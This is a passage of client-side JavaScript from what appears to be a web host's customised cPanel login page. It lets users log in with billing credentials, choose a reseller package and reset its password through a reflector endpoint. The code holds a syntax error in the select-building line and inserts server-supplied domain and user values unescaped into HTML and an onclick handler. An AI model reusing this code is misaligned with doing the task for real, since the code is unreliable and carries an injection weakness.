var request = {}
//This is the final step callback when we're sending cpanel the new passwords.
//Just a success/failure page.
function callback_on_reset (resp, status) {
$('#login_submit').removeAttr('disabled');
$('#login_submit').html('Reset Password');
if (!resp.responseJSON) resp.responseJSON = JSON.parse(resp.responseText);
if (status==='error' || resp.responseJSON.success === 0 || resp.responseJSON.statusCode==400) {
if (/because it is too weak/i.test(resp.responseJSON.error) || resp.responseJSON.statusCode==400) {
// If cpanel complained its too weak return and allow them to try the password again
$('#login-status').attr('class','error-notice');
$('#login-status-message').html('The password you selected was too weak. Please try a more complex password.');
$('#pass').val('');
$('#pass_verify').val('');
return;
}
$('#login-status').attr('class','error-notice');
$('#login-status-message').html('There was an error resetting your password. Please contact support for further assistance.');
$('#content-container').hide();
return;
}
// Success! Redirect them to their server and let them log in.
var btns = $("#button_container").html();
$('#login-status').attr('class','success-notice');
$('#login-status-message').html('Your password has been successfully reset!');
$('#login_form').html('<span style="font-size: 16px">Your password has been reset! <br/>Please log in with your new password.</span><br/><br/><br/><br/><br/><br/><br/>' + btns).css('width','285px');
$('#login_submit').html('Login with your new password').css('width','100%').parent().css('width','100%');
$('#reset_link').hide();
if (resJS.reset.resetType == 'reseller') {
$('#login_submit').attr('onclick','document.location.href="https://'+resJS.reset.selectedDomain+':2087/login?user=' + resJS.reset.user + '";return false');
} else {
$('#login_submit').attr('onclick','document.location.href="https://'+resJS.reset.selectedDomain+':2083/login?user=' + resJS.reset.user + '";return false');
}
}
// This is the callback for the HG credentials. // We set up the package dropdown and two password fields here.
function callback (resp, status) {
$('#login_submit').removeAttr('disabled');
$('#login_submit').html('Continue...');
if (!resp.responseJSON) resp.responseJSON = JSON.parse(resp.responseText); if (status==='error' || (resp && resp.responseJSON && resp.responseJSON.statusCode )) {
$('#login-status').attr('class','error-notice');
$('#login-status-message').html('Invalid Billing Credentials.');
$('#login-status').css('visibility','visible');
$('#pass').val('');
return;
}
resJS.reset.resetSelection = resp.responseJSON;
$('#login-status').attr('class','warn-notice');
$('#login-status-message').html('Password reset in progress.');
$('#login-status').css('visibility','visible');
resJS.reset.original_form = $('#forms').html();
var selectBlock = "<select id='package_select' class='input-field-login icon username-container' style='width:100%;border-radius:0px !important'>";
var host = new RegExp(document.location.hostname,'i');
var i,max,domain,hostname,selectedUsed;
for (i=0; i<resp.responseJSON.packages.reseller.length; i++) {
if (resp.responseJSON.packages.reseller[i].status==2) {
domain = resp.responseJSON.packages.reseller[i].package_information.domain;
hostname=resp.responseJSON.packages.reseller[i].server_information.hostname;
selectBlock+='<option ';
if (!selectedUsed && (host.test(domain) || host.test(hostname))) {
selectBlock+= 'selected="selected" ';
selectedUsed = true;
}
selectBlock += 'value="' + resp.responseJSON.packages.reseller[i].package_id;
selectBlock+='">'+domain+' (' + hostname + ')</option>';
}
}
// for (i=0; i<resp.responseJSON.packages.shared.length; i++) {
// if (resp.responseJSON.packages.shared[i].status==2) {
// domain = resp.responseJSON.packages.shared[i].package_information.domain;
// hostname=resp.responseJSON.packages.shared[i].server_information.hostname;
// selectBlock+='<option ';
// if (!selectedUsed && (host.test(domain) || host.test(hostname))) {
// selectBlock+= 'selected="selected" ';
// selectedUsed = true;
// }
// selectBlock += 'value="' + resp.responseJSON.packages.shared[i].package_id;
// selectBlock+='">'+domain+' (' + hostname + ')</option>';
// }
// }
selectBlock+='</select'>
$('.username-container').html(selectBlock);
$('.user-label').html('<label for="package_select">Please select your package.</label>');
$('.user-pw').html('<label for="pass">Enter a new password for user: <span id="userID">&nbsp;</span></label>');
$('#pass').parent().css('margin-bottom','5px');
$('#package_select').on('change', function (e) {
var val = $('#package_select').val();
var user = '';
var i,max,scratch;
for (i=0, max=resp.responseJSON.packages.reseller.length; i<max; i++) {
scratch=resp.responseJSON.packages.reseller[i];
if (scratch.package_id === val) {
user = scratch.package_information.username;
resJS.reset.selectedDomain = scratch.server_information.hostname;
break;
}
}
for (i=0, max=resp.responseJSON.packages.shared.length; i<max; i++) {
scratch=resp.responseJSON.packages.shared[i];
if (scratch.package_id === val) {
user = scratch.package_information.username;
resJS.reset.selectedDomain = scratch.server_information.hostname;
break;
}
}
if (user) {
resJS.reset.user = user;
$('#userID').html(user);
}
}).trigger('change');
$('#pass').attr('placeholder','Enter a new password!');
$('.password-container').after( '<div class="helper-text" style="margin-top:9px">Passwords must be at least 8 characters, and should have some complexity involving upper and lower case characters and numbers.</div>');
$('.password-container').after( '<div class="input-field-login icon password-container"><input name="pass_verify" id="pass_verify" placeholder="Please verify your new password." class="std_textbox" type="password" tabindex="3" autocomplete="off"/></div>');
$('#pass').val('');
$('#pass_verify').val('');
$('.password-container').css('border','2px solid #f6921e');
$('#login-container').css('height','410px');
$('#login-sub-container').css('height','400px');
$('#login-sub').css('height','295px');
/*
$('#login-container').css('height','393px');
$('#login-sub-container').css('height','383px');
$('#login-sub').css('height','275px');
*/
$('#login_submit').html('Reset Password');
resJS.reset.in_progress = true;
}
// OK back to the reset password toggle...
// If in_progress is set then the user is trying to submit the password.
if (resJS.reset.in_progress) {
$('#login-status').css('visibility','visible').show();
if ($('#pass').val().length < 8) {
$('#login-status').attr('class','error-notice');
$('#login-status-message').html('Your password must be at least 8 characters.');
return;
}
if ($('#pass').val() !== $('#pass_verify').val()) {
$('#login-status').attr('class','error-notice');
$('#login-status-message').html('Your passwords must match!');
$('#pass').val('');
$('#pass_verify').val('');
return;
}
var packTypes = ['reseller'];
var packs = resJS.reset.resetSelection.packages;
for (var currentType in packTypes) {
for (var pack in packs[packTypes[currentType]]) {
if ($('#package_select').val() == packs[packTypes[currentType]][pack].package_id) {
resJS.reset.resetType = packTypes[currentType];
}
}
}
request = {
type: "POST",
url: resJS.reset.reflectorUrl+"?action=SetPackagePasswordv2&packageId=" + $('#package_select').val() + "&packageType=" + resJS.reset.resetType,
data: JSON.stringify({
data:{
"password": $('#pass').val()
},
cookie: resJS.reset.resetSelection.cookie
}),
complete: callback_on_reset
}
$('#login_submit').html('Working...');
$('#login_submit').attr('disabled','disabled');
$.ajax(request);
return;
}
// in progress was not set so we just log them in or try to.
request = {
type: "POST",
url: resJS.reset.reflectorUrl+"?action=Login",
data: JSON.stringify({data:{
"username": $('#user').val(),
"password": $('#pass').val()
}}),
complete: callback
}
$('#login_submit').html('Working...');
$('#login_submit').attr('disabled','disabled');
$.ajax(request);
})
</script>
<div class="copyright">Copyright  2015 cPanel, Inc.</div>
</body></html>
